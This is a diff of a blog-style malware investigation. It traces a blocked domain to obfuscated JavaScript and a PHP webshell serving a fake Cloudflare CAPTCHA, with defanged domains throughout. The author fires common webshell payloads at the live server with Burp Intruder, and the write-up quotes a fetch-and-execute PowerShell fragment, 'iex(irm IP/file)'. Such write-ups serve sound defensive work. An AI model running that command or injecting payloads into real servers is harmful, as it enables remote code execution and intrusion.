@@ -4,8 +4,10 @@ Last month I was asked to look into a site that got blocked by an internet provi
 The site, "dkaksdaksortor[.]com" was dead upon access. So I was tasked to figure out what was on this site that caused it to be blocked.
 
 Since the site was dead, my first instinct was to check out the Wayback Machine to see if any bots had crawled the page. It was then that I noticed the page was redirecting me to a "mvjfkakfkfkaiai[.]com". I'm a month late in documenting this case, but as of typing, Wayback Machine doesn't redirect to that page anymore.<br>
-It's plausible that when Wayback's crawler visited an unrelated site that had this malicious ad loaded on it, it cached the .js file that was linked to it. That would explain how the redirect ended up in Wayback's records in the first place.<br>
-As for why it doesn't redirect anymore, the .js file was simply deleted.
+**If you visit dkaksdaksortor[.]com on Wayback Machine now, you're greeted with a 403 Forbidden error.**<br>
+**This would explain why it doesn't redirect anymore. The site was dead at the time of investigation and it found a redirect in the code somewhere.**<br>
+**But now the site is back up again as a 403, so no need to redirect.**<br>
+**At least, this is my best guess.**
 
 Accessing mvjfkakfkfkaiai[.]com leads you to a 404 error.
 
@@ -29,12 +31,12 @@ For this documentation, I'll only be focusing on fasfttt.js.
 That is a whole lot of obfuscated code. But if we look a little closer we can see some base64 hidden in there (highlighted area).<br>
 Throwing that into a decoder, it came out to: "https[:]//www[.]windowwashingexpert[.]com/lma.php".
 
-I did briefly attempt to deobfuscate the javascript as well, but all I could tell was that it was excessively looping to get a specific string value, and based off certain clues in the code like "__sync_load" and "sessionStorage", it can be assumed that other than externally loading the php site we found, it was probably gathering data like hostname and timestamp.
+I did briefly attempt to deobfuscate the JavaScript as well, but all I could tell was that it was excessively looping to get a specific string value, and based off certain clues in the code like "__sync_load" and "sessionStorage", it can be assumed that other than externally loading the php site we found, it was probably gathering data like hostname and timestamp.
 
-So now that we have this suspicious php webshell, what do we do with it? The javascript is already suspicious enough, but we still don't have anything to deem it malicious.<br>
+So now that we have this suspicious php webshell, what do we do with it? The JavaScript is already suspicious enough, but we still don't have anything to deem it malicious.<br>
 This is where Burp comes in handy. We'll intercept and see what we can pull from it.
 
-As of typing, this link now returns a 404. However, it was online at the time which you'll see the timestamp in the screenshot below. The following screenshots were taken as I was investigating.
+**As of typing, this link now returns a 404. However, it was online at the time which you'll see the timestamp in the screenshot below. The following screenshots were taken as I was investigating.**
 
 Looking at the lma.php webshell, there was nothing in the response in particular that stood out. At least on the client-side. If I wanted to see what was actually going on in that file, what was actually being loaded, I needed to get inside it. After some thinking, I figured this might be a good chance to try out some script injecting using Burp's Intruder Attack.<br>
 I found a small list of commonly used webshell payloads and crossed my fingers. And woah! Looks like I found something big!
@@ -68,7 +70,7 @@ Lets dissect that.<br>
 ・iex(irm IP/file) downloads and immediately executes a remote script from the IP
 
 Well, I think we have proof now that our suspicious webshell is indeed malicious.<br>
-What we can also assume is that dkaksdaksortor[.]com was simply a disposable front, a distribution site likely spread through phishing or malicious ads, designed to funnel victims toward the real infrastructure. The actual malicious javascript was hosted on mvjfkakfkfkaiai[.]com, which in turn loaded the fake Cloudflare CAPTCHA from the PHP webshell on windowwashingexpert[.]com.
+We can also assume that dkaksdaksortor[.]com was most likely used in a similar way as mvjfkakfkfkaiai[.]com (hosting malicious JavaScript code) due to its random spelling.
 
 But we can do better than that. ....Right?<br>
 What I really wanted was the php code, not the HTML.<br>
